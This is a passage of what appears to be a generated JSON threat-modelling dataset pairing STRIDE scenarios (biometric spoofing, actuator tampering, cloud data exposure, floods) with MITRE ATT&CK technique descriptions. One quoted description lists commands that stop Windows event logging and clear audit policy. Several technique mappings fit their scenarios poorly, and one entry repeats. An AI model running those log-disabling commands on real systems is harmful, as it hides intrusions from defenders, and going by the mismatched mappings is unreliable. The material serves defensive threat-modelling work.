avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious firmware into actuators to control them.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access the actuators or their interfaces.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to actuators"
                },
                {
                    "Assumption": "The firmware update mechanism lacks secure checks.",
                    "Role": "Firmware Developer",
                    "Condition": "Inadequate firmware validation"
                },
                {
                    "Assumption": "The actuators do not employ secure boot mechanisms.",
                    "Role": "Hardware Designer",
                    "Condition": "No secure boot"
                }
            ],
            "Potential Impact": "Unauthorized actions by actuators causing potential damage or security breaches.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware",
                "Actuators",
                "Control"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies initiating specific actions within the system possibly due to compromised credentials.",
            "Assumptions": [
                {
                    "Assumption": "System logs do not capture sufficient detail to identify actions conclusively.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "The attacker can compromise user credentials.",
                    "Role": "Attacker",
                    "Condition": "Access to user credentials"
                },
                {
                    "Assumption": "Actions are not tied robustly to the initiating user.",
                    "Role": "System Designer",
                    "Condition": "Weak session tracking"
                }
            ],
            "Potential Impact": "Difficulty in audit and accountability, leading to potential undetected abuse.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Credentials",
                "Logging",
                "Accountability"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator denies making changes to system configurations.",
            "Assumptions": [
                {
                    "Assumption": "System configuration changes are not tracked effectively.",
                    "Role": "System Developer",
                    "Condition": "Poor configuration management"
                },
                {
                    "Assumption": "The system allows administrator actions without thorough logging.",
                    "Role": "System Administrator",
                    "Condition": "Weak action logging"
                },
                {
                    "Assumption": "Access control measures are not stringent for configuration changes.",
                    "Role": "System Architect",
                    "Condition": "Weak access controls"
                }
            ],
            "Potential Impact": "Potential loss of system integrity and unauthorized configuration changes.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "System Configuration",
                "Administrator Actions",
                "Logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies accessing or deleting sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Access logs are incomplete or missing.",
                    "Role": "System Administrator",
                    "Condition": "Incomplete access records"
                },
                {
                    "Assumption": "The system does not enforce multi-factor authentication for sensitive actions.",
                    "Role": "System Developer",
                    "Condition": "Single-factor authentication"
                },
                {
                    "Assumption": "User access is not monitored in real-time.",
                    "Role": "System Designer",
                    "Condition": "Lack of real-time monitoring"
                }
            ],
            "Potential Impact": "Data integrity issues and potential unauthorized data disclosure.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Access",
                "Sensitive Data",
                "Monitoring"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive biometric data is intercepted during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Traffic is not secured using strong encryption.",
                    "Role": "Network Administrator",
                    "Condition": "Unencrypted transmission"
                },
                {
                    "Assumption": "The attacker has the capability to perform traffic interception.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle access"
                },
                {
                    "Assumption": "The system transmission protocols are outdated or flawed.",
                    "Role": "System Designer",
                    "Condition": "Insecure protocols"
                }
            ],
            "Potential Impact": "Compromise of sensitive information and unauthorized user profiling.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Biometric Data",
                "Transmission",
                "Encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the cloud storage holding sensitive user profiles.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage access controls are not stringent.",
                    "Role": "Cloud Administrator",
                    "Condition": "Weak access policies"
                },
                {
                    "Assumption": "There are exploitable vulnerabilities in cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Known vulnerabilities"
                },
                {
                    "Assumption": "The attacker can exploit misconfigurations in cloud storage.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of misconfigurations"
                }
            ],
            "Potential Impact": "Exposure of sensitive user profiles and potential identity theft.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Cloud Storage",
                "User Profiles",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal threat actor accesses sensitive data from the data repositories without proper authorization.",
            "Assumptions": [
                {
                    "Assumption": "Internal users have broad access privileges.",
                    "Role": "System Administrator",
                    "Condition": "Loose access controls"
                },
                {
                    "Assumption": "Data access is not adequately monitored or logged.",
                    "Role": "System Designer",
                    "Condition": "Insufficient monitoring"
                },
                {
                    "Assumption": "Sensitive data is not compartmentalized effectively.",
                    "Role": "Data Architect",
                    "Condition": "Poor data segregation"
                }
            ],
            "Potential Impact": "Leakage of sensitive data leading to financial and reputational damage.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Internal Threat",
                "Data Repositories",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication infrastructure, overwhelming network devices and causing service disruptions.",
            "Assumptions": [
                {
                    "Assumption": "The network devices are not adequately protected against volumetric attacks.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of DDoS protection"
                },
                {
                    "Assumption": "The communication infrastructure has limited capacity.",
                    "Role": "System Architect",
                    "Condition": "Network bandwidth limitations"
                },
                {
                    "Assumption": "The system does not utilize any traffic filtering or rate limiting mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Absence of rate limiting"
                }
            ],
            "Potential Impact": "Degradation or unavailability of services impacting user experience and productivity.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Network Flooding",
                "Infrastructure"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the actuators with a continuous stream of invalid commands causing them to fail.",
            "Assumptions": [
                {
                    "Assumption": "The actuators do not have input validation for received commands.",
                    "Role": "Firmware Developer",
                    "Condition": "Lack of input validation"
                },
                {
                    "Assumption": "The attacker has access to the communication channel with actuators.",
                    "Role": "Attacker",
                    "Condition": "Access to actuator network"
                },
                {
                    "Assumption": "There is no rate limiting on command input.",
                    "Role": "System Developer",
                    "Condition": "Lack of rate limiting"
                }
            ],
            "Potential Impact": "System disruption and potential physical damage from malfunctioning actuators.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Actuators",
                "Invalid Commands",
                "System Failure"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware causes overwhelming resource usage, leading to system slowdown or crash.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks adequate malware protection.",
                    "Role": "System Administrator",
                    "Condition": "Lack of anti-malware solutions"
                },
                {
                    "Assumption": "The attacker has the ability to deploy malware to the system.",
                    "Role": "Attacker",
                    "Condition": "Malware deployment capability"
                },
                {
                    "Assumption": "The system resources are not monitored for abnormal usage patterns.",
                    "Role": "System Designer",
                    "Condition": "Absence of resource monitoring"
                }
            ],
            "Potential Impact": "Service unavailability impacting user operations and system reliability.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Malware",
                "Resource Exhaustion",
                "System Crash"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain root access on user devices.",
            "Assumptions": [
                {
                    "Assumption": "User devices have unpatched vulnerabilities.",
                    "Role": "User",
                    "Condition": "Failure to update devices"
                },
                {
                    "Assumption": "The attacker has knowledge of and ability to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploit capability"
                },
                {
                    "Assumption": "Root access provides extensive control over the device.",
                    "Role": "System Architect",
                    "Condition": "Root privileges"
                }
            ],
            "Potential Impact": "Full control over user devices leading to unauthorized actions and data compromise.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Root Access",
                "Vulnerabilities",
                "User Devices"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised smart card to elevate their access rights within the system.",
            "Assumptions": [
                {
                    "Assumption": "The smart card security features are inadequate.",
                    "Role": "Hardware Designer",
                    "Condition": "Weak smart card security"
                },
                {
                    "Assumption": "The attacker can convincingly impersonate an authorized user.",
                    "Role": "Attacker",
                    "Condition": "Effective impersonation"
                },
                {
                    "Assumption": "The system allows role escalation based on smart card authentication.",
                    "Role": "System Architect",
                    "Condition": "Role escalation mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized access to and control over critical system functions.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Smart Card",
                "Access Rights",
                "Role Escalation"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware exploits weak session management to escalate privileges on user devices.",
            "Assumptions": [
                {
                    "Assumption": "The system session management is weak and susceptible to attacks.",
                    "Role": "System Developer",
                    "Condition": "Weak session handling"
                },
                {
                    "Assumption": "The attacker can deploy and run malware on user devices.",
                    "Role": "Attacker",
                    "Condition": "Malware deployment ability"
                },
                {
                    "Assumption": "The system lacks effective monitoring of session activities.",
                    "Role": "System Administrator",
                    "Condition": "Lack of session activity monitoring"
                }
            ],
            "Potential Impact": "System compromise allowing unauthorized actions and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Session Management",
                "Malware",
                "User Devices"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the biometric data of a legitimate user, gaining unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a high-quality biometric sample.",
                    "Role": "Attacker",
                    "Condition": "Biometric data is left accessible, e.g., fingerprints on a surface."
                },
                {
                    "Assumption": "The biometric sensor does not perform adequate liveness detection.",
                    "Role": "System",
                    "Condition": "System is configured without advanced biometric verification techniques."
                },
                {
                    "Assumption": "The attacker can physically access the device or environment.",
                    "Role": "Attacker",
                    "Condition": "Attacker is within the proximity of the devices."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user and system data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric",
                "user access",
                "physical access"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts communication between a user device and the system to send forged commands.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is not secured with adequate encryption.",
                    "Role": "System",
                    "Condition": "Using outdated or weak encryption protocols."
                },
                {
                    "Assumption": "The attacker can intercept the communication.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the network traffic."
                },
                {
                    "Assumption": "Authentication tokens or session details are not properly validated.",
                    "Role": "System",
                    "Condition": "Lack of robust session management mechanisms."
                }
            ],
            "Potential Impact": "Manipulation of device actions and possible data breaches.",
            "MITRE ATT&CK Keywords": [
                "network spoofing",
                "man-in-the-middle",
